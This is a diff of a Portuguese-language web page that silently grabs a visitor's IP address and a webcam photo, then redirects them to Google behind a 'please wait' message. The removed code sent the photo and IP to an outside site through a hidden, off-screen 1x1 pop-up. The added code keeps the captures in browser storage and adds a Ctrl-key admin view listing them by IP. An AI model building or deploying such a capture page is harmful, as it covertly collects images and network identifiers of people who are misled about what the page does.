@@ -3,38 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Foto Automática</title>
+    <title>Captura de Foto Automática / Modo Administrador</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background-color: #222; color: #eee; }
+        h1 { color: #4CAF50; }
+        #app-container { max-width: 800px; margin: 0 auto; }
+        #capture-view { text-align: center; padding-top: 50px; }
+        #admin-view { display: none; }
+        #history-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        #history-table th, #history-table td { border: 1px solid #444; padding: 10px; text-align: left; }
+        #history-table th { background-color: #333; cursor: pointer; }
+        #history-table tr:hover { background-color: #555; }
+        .active-row { background-color: #007bff !important; color: white; }
+        #photo-display { margin-top: 40px; text-align: center; }
+        #photo-display img { max-width: 100%; border: 3px solid #ccc; display: none; }
+        #status-message { color: yellow; font-weight: bold; margin-bottom: 10px; }
+        #redirect-timer { font-size: 1.2em; color: orange; }
+    </style>
 </head>
-<body style="background-color: #f0f0f0; text-align: center; padding-top: 50px;">
-    
-    <h1>📸 Capturando Imagem...</h1>
-    <p>Por favor, aguarde, você será redirecionado em breve.</p>
+<body>
 
+    <div id="app-container">
+        <div id="capture-view">
+            <h1>📸 Capturando Imagem...</h1>
+            <p id="status-message">Aguarde, você será redirecionado em <span id="redirect-timer">5</span> segundos.</p>
+            <p>Dica de Administrador: Pressione **Ctrl** para acessar o histórico.</p>
+        </div>
+
+        <div id="admin-view">
+            <h1>🔒 Modo Administrador - Histórico Local</h1>
+            <p>As fotos abaixo foram salvas **neste navegador** (Local Storage).</p>
+            
+            <div id="photo-display">
+                <h2>📷 Foto Selecionada</h2>
+                <p id="selected-ip-text">Clique em uma linha para ver a foto.</p>
+                <img id="selected-photo" src="" alt="Foto Capturada">
+            </div>
+
+            <table id="history-table">
+                <thead>
+                    <tr>
+                        <th>Endereço IP (Clique para Ver)</th>
+                        <th>Hora da Captura (Local)</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    </tbody>
+            </table>
+        </div>
+    </div>
+    
     <video id="webcam-video" autoplay playsinline muted style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
         // ==========================================================
-        // CONFIGURAÇÃO
+        // VARIÁVEIS E CONSTANTES
         // ==========================================================
-        
-        const VIEW_SITE_URL = 'https://leozin-code.github.io/ClienteViewFoto/'; 
         const REDIRECT_URL = 'https://www.google.com';
-
+        const STORAGE_KEY = 'photoHistory';
+        const REDIRECT_TIME_SECONDS = 5;
+        
         const video = document.getElementById('webcam-video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+        const captureView = document.getElementById('capture-view');
+        const adminView = document.getElementById('admin-view');
+        const redirectTimerSpan = document.getElementById('redirect-timer');
+        const tableBody = document.querySelector('#history-table tbody');
+        const selectedPhoto = document.getElementById('selected-photo');
+        const selectedIpText = document.getElementById('selected-ip-text');
+
         let photoData = null;
         let userIP = 'IP_NAO_ENCONTRADO';
         let webcamStream = null;
+        let redirectTimeoutId = null;
+        let historyData = [];
 
-        // Funções (Captura, IP, etc.) ...
+        // ==========================================================
+        // FUNÇÕES DE PERSISTÊNCIA E ADMIN
+        // ==========================================================
+        
+        function loadHistory() {
+            const storedData = localStorage.getItem(STORAGE_KEY);
+            if (storedData) {
+                historyData = JSON.parse(storedData);
+            }
+        }
+        
+        function saveHistory() {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
+        }
+
+        function displayPhoto(base64Img) {
+            selectedPhoto.src = `data:image/png;base64,${base64Img}`;
+            selectedPhoto.style.display = 'block';
+        }
+
+        function renderTable(selectedIndex = -1) {
+            tableBody.innerHTML = ''; 
+            
+            // Exibir dados mais recentes primeiro (reverse)
+            historyData.slice().reverse().forEach((item, index) => {
+                const originalIndex = historyData.length - 1 - index; 
+                const row = tableBody.insertRow();
+                
+                row.classList.toggle('active-row', originalIndex === selectedIndex);
+
+                row.insertCell().textContent = item.ip;
+                row.insertCell().textContent = new Date(item.timestamp).toLocaleString();
+                
+                row.onclick = () => {
+                    document.querySelectorAll('#history-table tr').forEach(r => r.classList.remove('active-row'));
+                    row.classList.add('active-row');
+                    
+                    selectedIpText.textContent = `Foto de: ${item.ip}`;
+                    displayPhoto(item.img);
+                };
+            });
+        }
+        
+        function enterAdminMode() {
+            if (redirectTimeoutId) {
+                clearTimeout(redirectTimeoutId); // Cancela o redirecionamento
+            }
+            if (webcamStream) {
+                webcamStream.getTracks().forEach(track => track.stop()); // Para a webcam
+            }
+            
+            loadHistory();
+            renderTable();
+
+            captureView.style.display = 'none';
+            adminView.style.display = 'block';
+            console.log("Modo Administrador Ativado!");
+        }
+
+        // ==========================================================
+        // FLUXO DE CAPTURA
+        // ==========================================================
+
         function fetchUserIP() {
             return fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => { userIP = data.ip; })
-                .catch(error => { console.warn("Falha ao obter IP. Usando IP_NAO_ENCONTRADO.", error); });
+                .catch(() => { userIP = 'IP_NAO_ENCONTRADO'; });
         }
+        
         function startWebcam() {
             return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                 .then(stream => {
@@ -43,6 +158,7 @@
                     return new Promise(resolve => video.onloadedmetadata = resolve);
                 });
         }
+        
         function takePhoto() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -50,56 +166,77 @@
             photoData = canvas.toDataURL('image/png').split(',')[1];
         }
 
-        // 4. Finalizar e Redirecionar (Abre/Salva/Fecha)
-        function finalize(data) {
-            // Parar o stream da webcam
-            if (webcamStream) {
-                webcamStream.getTracks().forEach(track => track.stop());
+        function saveAndRedirect() {
+            if (photoData) {
+                const newItem = {
+                    ip: userIP,
+                    img: photoData,
+                    timestamp: new Date().toISOString()
+                };
+                
+                loadHistory(); // Carrega o histórico atual
+                historyData.push(newItem); // Adiciona o novo item
+                saveHistory(); // Salva de volta no LocalStorage
             }
 
-            if (data && data.img) {
-                // Constrói a URL de salvamento
-                const finalURL = VIEW_SITE_URL + 
-                                 `?ip=${encodeURIComponent(data.ip)}&img=${encodeURIComponent(data.img)}`;
-                
-                // Abre em uma nova janela para forçar o salvamento no LocalStorage
-                // O 'width=1,height=1' é para minimizar o pop-up
-                const newWindow = window.open(finalURL, '_blank', 'width=1,height=1,left=9999,top=9999');
+            // Inicia o contador de 5 segundos
+            let timeLeft = REDIRECT_TIME_SECONDS;
+            redirectTimerSpan.textContent = timeLeft;
 
-                // Tempo para salvar e fechar
-                setTimeout(() => {
-                    try {
-                        if (newWindow && !newWindow.closed) {
-                            newWindow.close(); // Tenta fechar a aba de salvamento
-                        }
-                    } catch (e) {
-                        console.warn("A janela de salvamento não pôde ser fechada automaticamente.");
-                    }
-                    
-                    // Redireciona a aba original para o Google
-                    window.location.href = REDIRECT_URL;
-                }, 1500); // 1.5 segundos para salvar e fechar
-                
-            } else {
-                 // Falha: redireciona diretamente
-                 window.location.href = REDIRECT_URL;
-            }
+            const countdown = setInterval(() => {
+                timeLeft--;
+                redirectTimerSpan.textContent = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = REDIRECT_URL; // Redireciona
+                }
+            }, 1000);
+
+            // Salva o ID do timeout para poder cancelar o redirecionamento
+            redirectTimeoutId = countdown; 
         }
 
-        // Fluxo Principal (executa sequencialmente)
+        // ==========================================================
+        // INICIALIZAÇÃO E CONTROLE DE TECLAS
+        // ==========================================================
+        
+        // 1. Lógica de controle de teclas (CTRL)
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'Control') {
+                e.preventDefault(); // Evita ações padrão do navegador com Ctrl
+                enterAdminMode();
+                window.removeEventListener('keydown', arguments.callee); // Remove o listener após entrar
+            }
+        });
+
+        // 2. Fluxo de inicialização principal
         async function runCaptureFlow() {
+            // Se o modo administrador foi ativado pela tecla pressionada no load, não faz mais nada.
+            if (adminView.style.display === 'block') return;
+
             await fetchUserIP();
             
             try {
+                // Tenta iniciar a captura
                 await startWebcam();
                 takePhoto();
-                finalize({ ip: userIP, img: photoData });
+                // Inicia o processo de salvamento e redirecionamento
+                saveAndRedirect();
+                
             } catch (e) {
-                console.error("Erro no fluxo de captura:", e);
-                finalize(null); 
+                console.error("Erro na captura:", e);
+                document.getElementById('status-message').textContent = "Falha ao acessar a câmera. Redirecionando...";
+                
+                // Se falhar, redireciona após 2 segundos sem salvar
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
             }
         }
-
+        
+        // Se a tecla Ctrl foi pressionada antes da página terminar de carregar, 
+        // o `keydown` já terá nos colocado no modo admin.
         window.onload = runCaptureFlow;
     </script>
 </body>
